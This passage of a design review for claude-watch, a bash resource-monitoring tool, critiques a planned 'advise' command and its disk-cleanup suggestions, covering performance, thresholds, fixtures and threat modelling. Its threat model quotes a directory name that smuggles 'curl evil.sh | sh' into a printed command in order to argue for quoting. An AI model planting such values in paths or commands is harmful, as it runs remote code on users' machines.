  the memory analyzer must not copy `report`'s `minfree` idiom
  (`claude-watch:263`), which cannot record a genuine zero — recorded as a known
  defect in HANDOFF §7 by U6.
- **Proposed thresholds, unratified**, carried forward for the v2 gate:
  `cpu.sustained` critical `>= 1.00` core, warn `>= 0.35` (not 0.25 — a Claude
  session averaging 0.25 cores over 24h trips it on its ordinary baseline, and a
  warning that fires every ordinary day is a warning nobody reads), info at the
  floor; `cpu.spike` warn `>= 0.8 × ncpu`, info `>= 0.5 × ncpu`; `mem.pressure`
  critical `min_free < 100M` **and** `>= 25%` of samples under 500M, warn
  `max_swap >= 1024M`. Each gets a `CLAUDE_WATCH_*` knob per §5.
- **Fixtures**, all specified and none written: 100 samples at 10s with one name
  at 0.5 cores in every sample → `cpu_seconds` 500, `sustained_cores` 0.5 →
  `warn`; one fixture per threshold boundary at ±1; a same-name-many-processes
  fixture proving the per-sample fold and that RSS is not summed; an
  estimate-era-only fixture; a mixed-era fixture asserting the boundary interval
  uses `pcpu × iv`; a child-exits-mid-window fixture (no negative `cpu_seconds`);
  a new-pid-enters fixture (no lifetime spike); a delta-exceeds-`interval × ncpu`
  fixture; and a high-load / zero-`proc`-row fixture that must not emit `ok`.
- **Also deferred, and not lost:** unit unification between `claude-top` (%) and
  `claude-watch` (×) — HANDOFF §7b; retention running outside the shell hook —
  §7d; GPU/ANE power — §7c, which needs a privileged helper and whose mitigation
  is the caveat text; per-app breakdown of `~/Library/Containers` — TCC-hostile
  to walk; transcript deletion commands — §8 open decision 2.

---


# CEO / STRATEGY REVIEW — appended 2026-08-06

> **Folded in.** Its surviving findings are in the spec above; it is retained as
> the audit record, not as spec.
>
> **Read this first: everything below predates the approval gate.** The four gate
> decisions in §0 (G1–G4) supersede it wherever they conflict, and inline
> `SUPERSEDED` notes mark the specific places. It also uses the **old unit
> numbering**: old U0→U2, U1→U3, U2→U4, U3→U5, U4→U6, U7→U7; old U5 (unpushed)
> and U6 (report fixtures) left the plan for a separate PR (G4); new U0
> (aggregation) and U1 (sampler schema) have no old equivalent. Kept in full
> because its findings are what produced the gate decisions.

Mode: SELECTIVE EXPANSION, headless with auto-decisions. Nothing above this line
was edited, reordered or deleted; §8's open decisions stay as written and are
answered in the Decision Audit Trail (§C6) rather than in place.

The four user-fixed items (bash is the application, rolling 24h default with
week/month selectors, disk domain in scope, nothing deletes) are treated as
settled and are not re-argued anywhere below.

---

## 0A. Premise challenge

Seven premises hold this plan up. Named, then evaluated.

**P1 — "The user needs one ranked cross-domain list instead of reading four
commands."** The plan's stated justification is weak on its own: this is a
single-user tool and that user already knows `report`, `orphans` and
`worktrees`. The premise survives for a *different* reason than the plan gives.
`skills/claude-watch/SKILL.md` currently hands Claude four JSON blobs and a
prose paragraph of interpretation rules ("rank by `cpu_seconds`, not
`peak_cores`", "never add RSS across processes"). Every one of those rules is a
severity judgement the model re-derives from scratch on each invocation, and any
of them can be got wrong silently. `advise` moves that judgement into bash,
where it is fixture-testable. **The real premise is "model-side severity
derivation is non-deterministic and should be moved into the tool" — and that
one is solid.** Recommend the plan say so, because it also explains why the
skill-is-a-relay constraint is not arbitrary.

**P2 — "One `score` on one scale makes CPU, memory, disk and leaks
commensurable."** This is the plan's most elegant claim and it is doing less
work than §4 says. Ranking is `(severity_rank, score)` with severity dominant,
so `score` only ever breaks ties *inside* one severity band. Cross-domain
ordering is therefore decided by the §5 threshold table — which is precisely the
"hand-tuned weighting table" §4 claims to have avoided. The elegance is real but
it is local, not global. Two consequences worth stating in the plan: the §5
numbers carry the entire cross-domain ranking and deserve the scrutiny open
decision 1 asks for; and `score` should be documented as an intra-severity
tie-breaker, not as a universal urgency metric, or a future reader will trust it
for something it does not do. **QUESTIONABLE as stated, solid once re-scoped.**

> **SUPERSEDED by gate decision G1.** P2 is not re-scoped, it is deleted. The
> user asked for priority order *in each domain*; the cross-domain list was the
> planner's expansion. A second review confirmed the ordering is constant —
> each domain divides by its own denominator, so disk ≫ memory ≫ cpu on every
> machine, forever. `score` is now `share_of_domain`, meaningful only within one
> domain, and there is no global `findings[]` and no `rank`. See §4.

**P3 — "HANDOFF §7h is wrong; rebuildable build output is the real reclaimable
mass."** Measured and correct — re-verified here: `/System/Volumes/Data` is
421,492,816 KB used of 482,797,652 with 20,794,700 available. §7h's transcript
claim is fourth by size. The plan's dated-correction approach (append, don't
rewrite) is the right handling. **SOLID.**

But P3 carries a rider the plan never names. Once `advise` recommends
`rm -rf ~/Dev/buzz/target`, `claude-watch` is no longer only "what did Claude
cost me" — it is also a general-purpose disk cleaner, a category with mature
incumbents (`ncdu`, `npkill`, DaisyDisk, `cargo clean` itself). The disk domain
is fixed by the user and is not being challenged. What *is* worth deciding is
framing: the disk domain earns its place in this repo because agent sessions are
what generate the build artifacts, and the plan should say that out loud in
README and SKILL.md so the tool's identity stays coherent at the 12-month mark.

**P4 — "A rolling 24h window is the right default."** Correct in principle: the
existing `report` is calendar-day scoped, so at 09:00 it summarises one hour and
looks like a quiet machine. Rolling 24h fixes a real defect. **SOLID.** The
rider is data availability, not correctness: `~/.claude-watch/raw` currently
holds exactly **two** day files (2026-08-05, 2026-08-06). `--window month` will
return two days of data for the next 28 days. §9 clamps to retention but has no
concept of "requested more than exists", so a month view will present two days
of evidence under a month heading. Fix in §C3-F18.

**P5 — "Read-only is enough; proposing beats doing."** Consistent with the
project's ethos and with the `/claude-watch-reap` split. **SOLID**, with one
asymmetry the plan should own: `worktrees --remove` refuses to act without a tty
(HANDOFF §12), yet `advise` will print a copy-pasteable `rm -rf` with no guard
of any kind. The command is not executed by us, but it is authored by us. That
raises the bar on *which* paths earn a literal removal command — see §C3-F14.

**P6 — "The bash-application / skill-relay split extends cleanly to ranked
advice."** Fixed by the user, and it does extend. Noting one 12-month
consequence for the record: thresholds compiled into bash constants cannot take
context the model has and the tool does not ("I am about to do a large build, so
disk matters more than usual today"). That is an acceptable trade now and a
known ceiling later. **SOLID.**

**P7 — "The `unpushed` fix (U5) belongs in this feature."** The bug is real and
verified in the source: `claude-watch:956` branches on whether `@{u}` resolves,
and `claude-watch:961` counts the **entire history** when it does not;
`still_removable()` at `claude-watch:1000-1004` returns 1 unconditionally in the
same case. Fixing it is clearly right. Bundling it here is **QUESTIONABLE**: it
changes the blast radius of `worktrees --remove --yes`, the single most
destructive path in the tool, inside a feature whose headline property is
"nothing here deletes anything". Kept in scope (U4 consumes `scan_worktrees`
output, so it is inside the blast radius, and it is well under a day) but it
must land as its own commit with its own review gate — §C6 D5.

> **SUPERSEDED by gate decision G4.** Not a separate commit inside this feature —
> a separate PR, ahead of it, together with the `report` fixtures (old U6). Both
> fix known defects, neither depends on `advise`, and U6's fixtures are the
> regression harness the new U0 aggregator rewrite lands against. See the note at
> the head of §6.

**What if we did nothing?** The pain is real but narrow. The disk finding is a
one-time 25G reclaim the owner could do today with `du | sort`. The durable
value is the recurring, deterministic, agent-callable ranking — which is exactly
P1's re-scoped version. The plan is worth building; the *reason* wants
restating.

---

## 0B. Existing-code leverage map

Nine of this feature's sub-problems already have a working implementation in the
repo. The plan reuses six and rebuilds three.

| Sub-problem | Existing code | Plan's handling | Verdict |
|---|---|---|---|
| Read a day file, `.tsv` or `.tsv.gz` | `read_day()` `claude-watch:141` | `cw_read_window` iterates it | reuse — correct |
| Derive the sampling interval from data | `claude-watch:316-320` | U1 reimplements | **rebuild — see F1** |
| `observed_seconds` = `sysn × iv` | `claude-watch:321` | U1 reimplements | **rebuild — see F1** |
| Per-sample same-name fold | `report()`'s `flush()` | U1 reimplements | rebuild — accepted, entangled |
| JSON string escaping | `JESC_AWK` `claude-watch:88-130` | reuse verbatim | reuse — correct |
| Terminal control-byte stripping | `orphans()` (`tr '\001-\037\177'`) | reuse | reuse — correct |
| Orphan tree classification | `scan_orphans()` `claude-watch:452` | U4 consumes TSV as-is | reuse — correct, and stated as a constraint |
| Worktree liveness + staleness | `scan_worktrees()` `claude-watch:935` | U4 consumes TSV as-is | reuse — correct |
| Integer argument validation | `is_uint()` `claude-watch:434` | `--window` follows the same discipline | reuse — correct |
| Colour handling | `C_*` at `claude-watch:57-63` | U0 reuses | reuse — correct |
| Shared awk fragment as a string constant | `JESC_AWK` — the established pattern | not applied to window arithmetic | **gap — see F1** |

The one structural miss: this codebase already solved "share awk between two
programs" with `JESC_AWK`, and the plan's open decision 3 frames the only
alternative to duplication as "refactor the highest-risk region". A third option
exists and uses the pattern already in the file. §C6 D3.

Nothing else is being rebuilt. `tools/disk-scan.sh` has no precedent in the repo
and is genuinely new.

---

## 0C. Dream state

```
  CURRENT STATE                    THIS PLAN                      12-MONTH IDEAL
  ─────────────                    ─────────                      ──────────────
  4 commands, 4 JSON shapes.       + advise: 1 ranked list        One question, one
  Severity lives in the model's    across 4 domains.              answer, always current.
  head, re-derived per call        Severity is bash constants,
  from SKILL.md prose.             fixture-tested at every        Severity still in bash;
                                   threshold boundary.            thresholds now calibrated
  Calendar-day scoped only:                                       against this machine's own
  at 09:00 "today" is 1 hour.      + rolling 24h / week / month.  history rather than guessed.
                                     (28 days until week/month
  Disk: invisible. The largest      have real data behind them.)  Disk trend, not snapshot:
  single reclaimable mass on                                      "node_modules grew 4G this
  the machine (25.5G rebuildable   + disk domain: volume, 5       week" beats "you have 4.8G".
  + 4.8G node_modules) is not       groups, capped dir lists,
  measured by any command.          concrete actions.             Advice with memory: what was
                                                                  advised, what was acted on,
  report: 3.55s for 4,137 sys      + a second window aggregator   what was dismissed. No
  rows — quadratic, unmeasured,     and 7 new fixture files       repeating rank 1 for 30 days.
  and about to be asked for
  259,200 rows.                    + the O(n²) fix that makes     One aggregator, fixtured,
                                     week/month possible at all.  fast enough that window
  worktrees: `unpushed` reports                                   length stops being a design
  full history for conductor       + U5: unpushed counted         constraint.
  branches (beirut 14, philly       against all remotes.
  121; truth 0 and 15).                                           GPU/ANE still absent (§7c) —
                                                                  the known ceiling.
```

Direction: toward the ideal on every axis. The plan does not create a single new
obstacle to the 12-month state. Its main under-reach is treating advice as
stateless — see §C6 D25.

---

## 0C-bis. Implementation alternatives

```
APPROACH A: The plan as written — 8 units, 4 analyzer files, frozen TSV contract
  Summary: U0 keystone + 4 parallel domain analyzers + standalone disk scanner,
           joined by a line-oriented TSV contract (§3b) and a JSON contract (§3d).
  Effort:  L (human ~3-4 days / CC ~3-4 h)
  Risk:    Med — the O(n²) aggregation defect (F1) is fatal to week/month until fixed
  Pros:    Genuinely parallel; each analyzer independently fixture-testable;
           severity is a pure function of (value, threshold) so boundaries are
           testable without live processes; contract-first means U1/U3/U4 can be
           briefed simultaneously with U0.
  Cons:    Four files where the domain logic is ~400 lines total; a second window
           aggregator duplicating report()'s arithmetic; U5 rides along inside a
           read-only feature.
  Reuses:  read_day, JESC_AWK, scan_orphans, scan_worktrees, is_uint, C_*.

APPROACH B: Minimal viable — one tools/advise.sh, disk only, no window selectors
  Summary: Add the disk domain (the only genuinely new information), print it
           ranked against a fixed threshold table, keep `report` as the CPU/memory
           surface. No window reader, no second aggregator, no --window flag.
  Effort:  S (human ~4-6 h / CC ~30 min)
  Risk:    Low
  Pros:    Delivers ~90% of today's actual value (the 25.5G finding) in ~15% of
           the work; touches `claude-watch` in exactly one place; sidesteps F1
           entirely because it never aggregates a window.
  Cons:    Leaves the user-fixed 24h/week/month decision unimplemented; leaves
           severity derivation for CPU/memory in the model's head, which is the
           re-scoped P1 problem; the ranked cross-domain list — the actual feature
           — does not exist.
  Reuses:  JESC_AWK, C_*, is_uint.
  → Rejected: it deletes two of the four user-fixed decisions.

APPROACH C: Ideal architecture — one shared window aggregator, then domains on top
  Summary: Approach A, plus: extract the window arithmetic (interval derivation,
           observed_seconds, lastep, epoch bounds) out of report()'s awk into a
           CW_WINDOW_AWK string constant — the same mechanism JESC_AWK already
           uses at claude-watch:88 — fix its O(n²) sorts to O(n) there, and have
           BOTH report() and the advise window pass consume it. U6's report
           fixtures land first so the extraction is done against a green suite.
  Effort:  L+ (human ~4-5 days / CC ~4-5 h) — one extra unit, U1 sequenced after U6
  Risk:    Med-Low — higher than A on sequencing, LOWER than A on correctness,
           because it removes the second copy of the arithmetic where four bugs
           have already been found by eye.
  Pros:    One definition of "how long were we actually observing"; the O(n²) fix
           lands once and `report` gets faster too (3.55s → sub-second today,
           15.5s → sub-second for a full day); uses a pattern already in the file
           rather than inventing one; week/month become feasible instead of
           theoretical.
  Cons:    U1 can no longer start in parallel with U0 — it waits on U6 + the
           extraction. Costs roughly half a day of wall-clock parallelism.
  Reuses:  everything A reuses, plus the JESC_AWK sharing mechanism itself.
```

**RECOMMENDATION: Approach C.** Two copies of the arithmetic that has already
produced four bugs is the exact repetition the DRY preference exists to prevent,
and the extraction is not the risky full-refactor open decision 3 imagines — it
is ~20 lines of window arithmetic, extracted after U6 makes that region
fixture-covered. The measured O(n²) defect (F1) forces a touch of this code
regardless; doing it once in a shared place costs almost nothing more than doing
it twice in two places.

Scope of the extraction, stated tightly so it does not grow: interval
derivation, `observed_seconds`, `lastep`, min/max epoch. **Not** the per-sample
`flush()` fold — that is entangled with `report()`'s display arrays and stays
duplicated, deliberately, with fixtures on both sides (U1 + U6).

> **PARTLY SUPERSEDED by G2 and G4.** The half of Approach C that mattered — fix
> the O(n²) defect once, against a green fixture suite, before any window ships —
> is adopted and is now U0. The other half, extracting `CW_WINDOW_AWK` so
> `report()` and the advise pass share the arithmetic, is *not* settled and stays
> live as **open decision 2**. Its strongest argument has weakened: with U0
> fixing `report()` first and the advise pass written linear from the start, the
> fix no longer lands twice. The sequencing this section proposes (U6's fixtures
> first) survives — those fixtures are now in the separate PR that gates U0.

---

## 0E. Temporal interrogation

**HOUR 1 — foundations.** The implementer of U0 needs three things the plan does
not yet state. (a) The disk cache TTL is referenced four times and never given a
number — decided as 6h in §C6 D12. (b) `advise`'s exit code is undefined; its
sibling commands carry meaning in theirs (`status` exits 1 with no samples,
`doctor` non-zero when broken), so silence here will be resolved by guessing —
decided in §C6 D15. (c) Whether the four analyzers are sourced at the top of
`claude-watch` or lazily inside `advise()`. Top-level sourcing puts four extra
file reads on every `claude-watch` invocation including `hook`, whose cost
budget is documented in HANDOFF §6. Decided: lazy, §C6 D19.

**HOUR 2-3 — core logic.** The ambiguity that will bite hardest is the volume
denominator. Three different percentages are in play on this machine right now
and the plan uses all three without noticing: `used/total` = 87.3%, `df`'s own
Capacity column = 96%, and `avail/total` = 4.3%. §3d's example JSON shows
`"score": 0.96`; §4's formula yields 0.873; §5's threshold fires on 4.3%.
Whoever writes U3 will pick one and the fixtures will encode it. Decided in §C6
D11. Second ambiguity: what "critical inherits" means in §5's
`disk.reclaimable.<group>` row — inheriting a severity but keeping its own score
is fine, but the implementer needs it spelled out.

**HOUR 4-5 — integration.** Two surprises are waiting. First, U4's
`advise-leaks.sh` cannot be sourced standalone: it calls `scan_orphans` and
`scan_worktrees`, which are functions inside `claude-watch`, so `bash -n` passes
but the fixture cannot exercise it without the parent. Every analyzer needs an
explicit split into a pure `<domain>_findings()` (value+threshold in, severity
out) and an impure `advise_<domain>()` that gathers inputs and calls it — §C6
D20. Second, the first real `--window week` run will not return. F1 is not a
tuning problem; at 60,480 sys rows the current aggregation shape needs ~12.6
minutes, and a month needs ~4 hours. Whoever hits that will assume they wrote a
bug. They did not; they inherited one.

**HOUR 6+ — polish and tests.** Three things the implementer will wish had been
decided up front. How many findings the human renderer prints before truncating
(five groups × up to 20 dirs is a plausible 40-line wall) — §C6 D16. What
`advise` prints when all four domains are `ok`, which is the state the owner
will be in most often once the disk is cleaned, and the state that decides
whether this command gets run twice or daily — §C6 D17. And whether a second
`advise` in the same minute triggers a second 30-90s `du` sweep, which for a
tool whose defining constraint is "leave nothing running" is a particularly
unfortunate way to fail — §C6 D22.

---

## 0D. Complexity check and minimum set

The plan touches 12 files and introduces 5 new ones. That is over the 8-file
smell threshold, so: is the same goal reachable with fewer moving parts? Partly.
U6 (report fixtures) and U5 (unpushed fix) are not `advise` — they are 2 of the
8 units and neither is required for the feature to work. Both are kept, for
reasons that are specific rather than general: U6 is now load-bearing because F1
forces a change to `report()`'s aggregation and that change must land against a
green fixture suite, and U5 is inside U4's blast radius because U4 consumes
`scan_worktrees` output including the wrong `unpushed` number. Everything else
in the plan traces directly to the four user-fixed decisions.

The minimum set that achieves the stated goal is U0 + U2 + U3 (disk end to end)
+ U7. U1 and U4 are what make it *cross-domain*, which is the feature. Nothing
is deferrable without losing a fixed decision.

---

## §C1. Section-by-section review

### Section 1 — Architecture

The component boundaries are good. The dependency graph the plan creates:

```
                        ┌───────────────────────────┐
                        │   claude-watch (dispatch) │
                        └────────────┬──────────────┘
      existing ─────────────┬────────┴────────┬───────────── new
                            │                 │
              ┌─────────────▼──────┐   ┌──────▼──────────────────┐
              │ report()           │   │ advise()  [tools/advise.sh]
              │ orphans()          │   │  ├ cw_read_window ──┐   │
              │ worktrees()        │   │  ├ rank / render    │   │
              │ scan_orphans()  ◄──┼───┼──┤ emit_json        │   │
              │ scan_worktrees()◄──┼───┼──┘                  │   │
              │ read_day()      ◄──┼───┘                     │   │
              │ JESC_AWK        ◄──┼─────────────────────────┘   │
              └────────┬───────────┘                             │
                       │                     ┌───────────────────┴────────┐
      ┌────────────────▼──────────┐          │  advise-cpumem.sh  (stdin) │
      │ CW_WINDOW_AWK  (Appr. C)  │◄─────────┤  advise-disk.sh  (cache)   │
      │ interval / observed / ep  │          │  advise-leaks.sh (fn calls)│
      └───────────────────────────┘          └────────────────────────────┘
                                                          ▲
                                        ┌─────────────────┴──────────────┐
                                        │ tools/disk-scan.sh (standalone)│
                                        │   df -k · find -prune · du -skx│
                                        │   → $CW_DISK_CACHE (temp+mv)   │
                                        └────────────────────────────────┘
```

**F1 — CRITICAL. The window aggregation is O(n²) and the week/month selectors
cannot run.** `report()`'s awk sorts the sample-epoch array at
`claude-watch:305-306` and the gap-delta array at `claude-watch:318-319` with
selection sorts and no early exit. Measured on this machine today:
`claude-watch report today --json` takes **3.55s for 4,137 sys rows**.
Extrapolating quadratically from that measured point:

| window | sys rows | estimated aggregation time |
|---|---|---|
| full 24h day | 8,640 | ~15.5s |
| week | 60,480 | **~12.6 minutes** |
| month | 259,200 | **~3.9 hours** |

The plan's §1 runtime table budgets ~1s for week and <10s for month. That is
wrong by three orders of magnitude. The 0.07s/60k-rows measurement it cites is
the cost of *reading and filtering* rows, not of aggregating them. Two fixes,
both straightforward: the epoch array needs no sort at all (rows are
append-only and time-ordered, so track running min/max and detect out-of-order
with one comparison), and the median gap needs a counting histogram
(`hist[gap]++` over gaps bounded by 600, then walk the buckets) rather than a
sort — exact, O(n + 600), and it works in macOS awk 20200816, which has no
`asort()`. This defect is pre-existing in `report()`; the feature is what makes
it fatal. It also means the plan's `--window month` budget of "<10s" should be
re-measured, not re-estimated, once fixed.

> **Accepted at the gate as G2, with a re-measured base.** The finding stands and
> now has its own unit, U0, ahead of the window reader. Timings were re-measured
> directly against sample count (1,047 → 0.28s; 2,095 → 0.92s; 4,191 → 3.64s)
> rather than extrapolated from one `report today` run: ~15s/day, ~13 min/week,
> ~3.9 h/month. Both fixes above are adopted verbatim, plus a timing fixture
> asserting a synthetic week-sized input aggregates in under 5s. See §6 U0.

**F2 — WARNING. Sourcing four analyzer files at the top of `claude-watch` taxes
every invocation.** U0 places the source line "near the existing
`orphan-policy.sh` source", i.e. at file scope. `hook` is the once-a-day path
whose cost is documented in HANDOFF §6 and protected by a §9 gotcha. Source the
analyzers lazily inside `advise()`.

**F3 — WARNING. `tools/advise-leaks.sh` is not independently loadable.** It
calls `scan_orphans` and `scan_worktrees`, which are `claude-watch` functions.
The §3b contract says analyzers define one function each; that shape makes U4's
fixture impossible to write without the parent script. Every analyzer needs the
pure/impure split (see F13).

**Coupling.** New coupling: `advise-leaks.sh` → `scan_orphans`/`scan_worktrees`
(justified — reuse is the point, and re-implementing classification is
explicitly forbidden), and `advise-disk.sh` → the §3c cache format (justified —
that decoupling is what lets U3 proceed without U2). No coupling is created
between the four analyzers, which is the right call.

**Scaling.** 10× is a month-long window: F1. 100× is a year: retention caps at
30 days so it cannot happen. The disk scanner scales with inode count under
`~/Dev`, not with time — F6.

**Single points of failure.** `cw_read_window` is one: every domain except disk
depends on it. Correctly identified as the keystone.

**Rollback posture.** Excellent by construction. `advise` and `disk` are new
subcommands; a `git revert` of U0's dispatch hunk removes the feature with no
data migration, no state to unwind, and no effect on the existing four commands.
The only unit with a non-trivial rollback is U5, which changes the meaning of an
existing `--json` field — see F9.

### Section 2 — Error and rescue map

Full registry in §C4. The pattern-level observations: bash has no exception
classes, so the analogue is exit codes and empty output, and the plan is mostly
disciplined about it (`unknown` for no-data, `ok` for checked-and-clean, exit 2
for bad args, `2>/dev/null` on `du`/`find`). Three gaps, all silent-failure
class, which is the category the prime directives call a critical defect.

**F4 — CRITICAL. The all-`unknown` state is indistinguishable from "everything
is fine" at the skill boundary.** If launchd has stopped the sampler, `advise`
returns cpu/memory `unknown`, leaks `ok` (a live scan still works), disk
whatever the cache says. A relay skill reading that JSON will report reassuring
news about a machine it cannot see. This is precisely the failure the tool was
built to prevent, reproduced one level up. Fix: `advise --json` carries the
`status`-equivalent freshness fields (last sample epoch, age), and SKILL.md
instructs the model to surface staleness before any finding.

**F5 — WARNING. `du`/`find` partial results are conflated with complete ones.**
§9 says a partial scan is "marked `partial` rather than reported as complete",
but §3c's TSV has no `partial` column and §3d's JSON has no `partial` field.
The mechanism is asserted and not specified. Add `partial` to both, set it when
any `du`/`find` exits non-zero or the deadline (F6) fires.

**F6 — WARNING. The disk scan has no wall-clock ceiling.** Budget is stated as
30-90s cold, from one measurement on one tree. `CLAUDE_WATCH_REPO_ROOTS` is
user-configurable, and commit `fd8a0f8` already records that a configured root
may be the repository itself. A root on a slow or network mount hangs an
interactive command with no way out but Ctrl-C. Needs a hard deadline
(recommend 120s), after which the scan writes what it has with `partial=1`.

### Section 3 — Security and threat model

Attack surface is small and mostly pre-solved by existing patterns.

**Input validation.** `--window` is the only new user input reaching logic.
The plan applies `is_uint`-grade discipline and exits 2 on anything else, which
matches the existing `--min`/`--days` handling and the smoke tests that cover
it. `CW_DISK_CACHE` and `CLAUDE_WATCH_REPO_ROOTS` are env-controlled paths; the
plan correctly routes paths into awk via `ENVIRON` rather than `-v` (HANDOFF §4
records why: `-v` performs backslash processing).

**Injection.** The genuinely new vector is **advice injection**: `advise` prints
shell commands containing filesystem paths, and paths are arbitrary bytes. A
directory named `target; curl evil.sh | sh` under a scanned root produces a
printed command the user may paste. The plan strips control bytes for terminal
output and `jesc()`s for JSON, which covers mojibake and JSON validity but not
shell safety. Fix: single-quote every path inside a printed command and escape
embedded single quotes, or refuse to print a command for any path outside
`[A-Za-z0-9._/-]` and print the path alone. **F7 — WARNING.**

**F8 — WARNING. `rm -rf` is printed on name-matching evidence alone.** U2
matches `.venv|venv|target|.next|DerivedData` by directory name and U3 prints a
removal command for the hits. A `target/` that is a source directory, or a
hand-made `venv` holding notes, gets an `rm -rf` next to it. Cheap fix that
turns a guess into evidence: only emit a removal command when a marker confirms
the kind — `Cargo.toml`/`pom.xml` beside `target`, `package.json` beside
`node_modules` and `.next`, `pyvenv.cfg` inside `.venv`/`venv`, `*.xcodeproj`
beside `DerivedData`. Unconfirmed hits are still *reported with their size*;
they just do not get a command.

> **ADOPTED and strengthened at the gate.** Both outside reviewers attacked this
> independently. §3c now requires *two* pieces of evidence, not one: the marker
> file above **and** an idle test (newest depth-1 mtime older than 14d), giving
> three confidence levels — `confirmed` (command printed), `likely` (marker but
> recently touched: size only), `unverified` (name match only: size and path
> only). §3c also carries a rebuild-cost table, because `.next` at seconds and
> `.venv` at "needs network and may not resolve to the same versions" are not the
> same offer, and "rebuildable" as a flat category overpromises. Shell-quoting and
> the metacharacter refusal are in §3b (F7).

**Authorization / secrets / PII.** No new endpoints, no credentials, no network
calls, no new dependencies. The scan reads directory sizes, never contents. The
one data-classification note: `advise --json` now embeds absolute paths from
`~/Dev` and `~/Downloads` into agent-visible output. That is already true of
`worktrees --json`, and HANDOFF §9's rule about anonymised published samples
extends to any README example of `advise`. Worth one line in U7.

**Audit logging.** Not applicable — nothing mutates.

### Section 4 — Data flow and interaction edge cases

```
  raw/*.tsv(.gz) ──▶ cw_read_window ──▶ advise_<domain> ──▶ rank ──▶ render/JSON
        │                   │                  │              │           │
        ▼                   ▼                  ▼              ▼           ▼
   [no files?]        [0 rows in       [no data →       [all ok →   [40-line wall?]
   → samples:0,        window?]         unknown]         what?]      [control bytes?]
     unknown           → observed:0     [threshold        F17         [invalid UTF-8?]
   [only 2 days         ÷0 RISK          boundary                     → jesc/tr: covered
    exist? F18]         → F10            exact?]
   [gz + plain
    same day?]

  $HOME volume ──▶ df -k ──▶ find -prune ──▶ du -skx ──▶ temp+mv ──▶ cache
        │             │           │             │            │
        ▼             ▼           ▼             ▼            ▼
   [not mounted?] [3 different [root == repo? [slow mount?  [concurrent
                   denominators  fd8a0f8]      → F6]         writers? F12]
                   → F11]       [perm denied? [network vol?
                                 → F5]         -x covers it]
```

**F10 — WARNING. Division by zero when the window contains no `sys` rows.**
Every share in §4 divides by `observed_seconds`, and `observed_seconds` is
`samples × interval`. A window that lands entirely inside a sleep gap, or a
`--window 1h` run on a machine that has been off, gives `samples = 0`. §9 covers
"no samples at all (fresh install)" but not "no samples *in this window*",
which is the far more likely case and reaches different code. awk yields `inf`
or `nan` rather than erroring, and `nan` in JSON is not valid JSON — which
breaks the agent contract silently. Guard `observed_seconds == 0` → the whole
domain is `unknown`, and add a fixture.

**F11 — WARNING. Three volume denominators are in use and the plan does not
pick one.** Verified on this machine: `used/total` = 87.3%, `df` Capacity = 96%,
`avail/total` = 4.3%. §3d's example shows `score: 0.96`, §4's formula produces
0.873, §5's threshold fires on 4.3%. Related macOS gotcha worth adding to
HANDOFF §4: `df -k /` reports the sealed system volume (46% here) while
`df -k "$HOME"` reports `/System/Volumes/Data` (96%) — same free space, wildly
different `used`. An implementer who reaches for `/` gets a reassuring, wrong
answer.

> **RESOLVED in §3c.** One convention, stated once: `volume_total_kb := used_kb +
> avail_kb`, and every disk percentage in the plan, the code and the JSON divides
> by it. That gives 95.3% capacity / 4.7% avail on this machine. `df`'s Size
> (460Gi) is the APFS container and is recorded but never used as a denominator;
> `df`'s Capacity (96%) is computed with reserved space and is not re-derivable
> from any field we publish. Every number in §3d, §4 and §5 was rewritten to
> match. The `df /` vs `df "$HOME"` gotcha goes to HANDOFF §4 (U7).

**F12 — WARNING. Two concurrent `advise` runs both cold-scan.** Atomic
`temp + mv` prevents a torn read but not duplicated 30-90s of `du`. A tool whose
defining constraint is leaving nothing running should not be able to start two
`du` sweeps over 25G. A lockfile in `$DATA/state/` with a stale-lock timeout,
and "a scan is already running, using the stale cache" on stderr.

**F13 — WARNING. Threshold boundaries are not independently testable as
specified.** §3b's "severity is a pure function of `value` vs `threshold`" is
the right idea, but §6's unit descriptions have each analyzer both gathering
inputs and deciding severity in one function. Mandate the split: pure
`<domain>_findings()` taking measured values and emitting `F` rows, plus
`advise_<domain>()` gathering inputs and calling it. Then U1/U3/U4's
boundary fixtures need no live processes, no cache file and no parent script.

**Interaction edge cases.** No UI, but `advise` is interactive in the CLI sense:
Ctrl-C during a cold disk scan must leave no temp file behind (the existing
`tmp_cleanup` trap pattern at `claude-watch:438` applies); a `--json` run must
never write the stderr cold-scan notice to stdout; and running `advise` twice in
a row must not re-scan (F12, and the TTL in D12).

### Section 5 — Code quality

Organisation fits the repo: `tools/*.sh` sourced by `claude-watch`, `C_*`
colours, `jesc()` on user-derived strings, `LC_ALL=C` on awk, paths via
`ENVIRON`. The plan is explicit about all of these, which is the mark of a plan
written against the code rather than about it.

**DRY.** One real violation (F1/D3: the window arithmetic) and one accepted
duplication (the per-sample fold, which is entangled with `report()`'s display
arrays and is covered by fixtures on both sides). §5's threshold constants
appearing both in the plan document and as named constants in each analyzer is
documentation drift waiting to happen — U7 should point README at the constants
rather than restating the numbers a third time.

**Naming.** `advise`/`disk` are clear. `cw_read_window`, `advise_<domain>`,
`reclaim_kb` all say what they do. `score` is the one misleading name — it reads
as a global urgency metric and is an intra-severity tie-breaker (P2); consider
`resource_share`.

**Over-engineering check.** Nothing speculative. Four analyzer files for ~400
lines is at the edge but is what makes the fan-out real (D6).

**Under-engineering check.** F10 (÷0), F6 (no deadline), F5 (`partial` asserted
not specified) are all happy-path assumptions.

**Cyclomatic complexity.** `scan_worktrees()`'s status chain
(`claude-watch:967-985`) already branches nine times, and U5 removes one branch
from it. Net improvement. No new function in the plan approaches that.

### Section 6 — Tests

```
  NEW CODEPATHS:      --window parse/validate/clamp · window read across .tsv+.tsv.gz ·
                      ranking · human render · emit_json · cache staleness · cold scan
  NEW DATA FLOWS:     raw TSV → window → per-domain TSV → ranked findings → JSON/human
                      $HOME volume → df/find/du → disk cache TSV → disk findings
  NEW EXTERNAL CALLS: df -k · find -prune · du -skx   (no network, no new deps)
  NEW ERROR PATHS:    bad --window · window exceeds retention · window exceeds available
                      data · no samples in window · cache missing · cache stale ·
                      permission denied · deadline exceeded · concurrent scan
  NEW BACKGROUND:     none, by design (the sampler-stays-stateless invariant)
  NEW UX:             `claude-watch advise`, `claude-watch disk`, two SKILL.md rows
```

The plan's fixture coverage is genuinely strong — seven fixture files, boundary
tests at value−1 and value+1 on every threshold, hand-checkable arithmetic, a
hermetic git sandbox for U5, synthetic trees for U2. This is the best-specified
part of the plan. Gaps:

- **No performance assertion.** F1 exists because nobody ever timed `report`.
  U6 should assert a wall-clock ceiling on a fixture with a realistic sample
  count (e.g. 60k sys rows must aggregate in under 5s), which is the test that
  would have caught F1 and will catch its regression.
- **No fixture for "no samples *in the window*"** as distinct from "no samples
  at all" (F10).
